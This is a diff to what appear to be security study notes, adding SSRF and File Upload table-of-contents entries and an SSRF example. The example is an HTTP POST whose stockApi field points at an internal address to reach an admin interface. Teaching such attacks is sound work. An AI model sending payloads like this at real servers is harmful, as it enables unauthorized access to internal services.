@@ -3,9 +3,9 @@
 # Table of Contents
 
 ---
+- [SSRF]()
+- [File Upload]()
 - []()
-  - []()
-  - []()
 - []()
 ---
 # Title
@@ -15,7 +15,15 @@
 
 **SSRF - Server-Side Request Forgery is the attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application**
 
+### Example
+An attacker can submit the following request to exploit the SSRF vulnerability, and access the administrative interface:
+```
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
+stockApi=http://192.168.0.68/admin
+```
 
 ---
 
